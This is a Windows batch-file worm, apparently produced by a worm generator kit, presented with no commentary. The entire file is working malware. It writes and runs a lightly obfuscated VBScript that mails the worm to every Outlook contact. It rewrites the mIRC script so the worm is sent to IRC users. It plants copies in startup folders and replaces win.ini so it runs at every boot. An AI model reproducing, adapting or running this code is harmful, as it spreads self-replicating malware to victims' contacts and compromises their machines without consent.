@echo off
REM Name:as
REM Author: as              
REM generated with BATCH WORM GENERATOR 2.01
ctty nul
Set MyS=%0
copy %MyS% as
copy as C:\as
copy as C:\igoag.vbs
set VBSwayF=dim
echo %VBSwayF% x > C:\igoag.vbs
set VBSwayF=
set VBSwayA=resume
echo.on error %VBSwayA% next >> C:\igoag.vbs
set VBSwayA=
set VBSwayG=FileSystem
echo Set fso =" Scripting.%VBSwayG%.Object" >> C:\igoag.vbs
set VBSwayG=
set VBSwayH=CreateObject
echo Set so=%VBSwayH%(fso) >> C:\igoag.vbs
set VBSwayH=
echo Set ol=CreateObject("Outlook.Application") >> C:\igoag.vbs
set VBSwayJ=WScript
echo Set out=%VBSwayJ%.CreateObject("Outlook.Application") >> C:\igoag.vbs
set VBSwayJ=
echo Set mapi = out.GetNameSpace("MAPI") >> C:\igoag.vbs
echo Set a = mapi.AddressLists(1) >> C:\igoag.vbs
echo Set ae=a.AddressEntries >> C:\igoag.vbs
echo For x=1 To ae.Count >> C:\igoag.vbs
echo Set ci=ol.CreateItem(0) >> C:\igoag.vbs
echo Set Mail=ci >> C:\igoag.vbs
set VBSwayC=Name
echo Mail.to=ol.Get%VBSwayC%Space("MAPI").AddressLists(1).AddressEntries(x) >> C:\igoag.vbs
set VBSwayC=
echo Mail.Subject="as" >> C:\igoag.vbs
set VBSwayL=Body
echo Mail.%VBSwayL%="as" >> C:\igoag.vbs
set VBSwayL=
set VBSwayM=Attachments
echo Mail.%VBSwayM%.Add("C:\as") >> C:\igoag.vbs
set VBSwayM=
set VBSwayE=Send
echo Mail.%VBSwayE% >> C:\igoag.vbs
set VBSwayE=
echo Next >> C:\igoag.vbs
echo ol.Quit >> C:\igoag.vbs
cscript C:\igoag.vbs
del C:\igoag.vbs
del C:\as
md C:\pro
copy as C:\pro\as
if exist C:\mirc\script.ini set mIRC=C:\mirc\script.ini
if exist C:\mirc32\script.ini set mIRC=C:\mirc32\script.ini
if exist C:\progra~1\mirc\script.ini set mIRC=C:\progra~1\mirc\script.ini
if exist C:\progra~1\mirc32\script.ini set mIRC=C:\progra~1\mirc32\script.ini
set spp=dcc send $nick C:\pro\as
echo [script] > %mIRC%
echo n0=on 1:filesent:*.*: { if ( $nick !=$me ) {halt} /%spp% } >>%mIRC%
copy as C:\flffh.bat
move  C:\flffh.bat %windir%\startm~1\progra~1\autost~1
copy as %windir%\Start Menu\Programs\StartUp\utiey.bat
md C:\suPs
copy as C:\suPs\zhiyv.bat
subst L: C:\suPs
copy as %WinDir%\system\WINI.bat
set inia=windows
echo [%inia%] >funny.bat
set inib=system
set inic=WINI.bat
echo run=%windir%\system\%inic% >>funny.bat
set inid=Port
echo Null%inid%=None >>funny.bat
copy funny.bat %windir%\dd.ini
set inif=win
del %windir%\%inif%.bat
set inig=unny
del f%inig%.bat
set inih=dd.in
ren %windir%\%inih%i win.ini
@del as
ctty CON
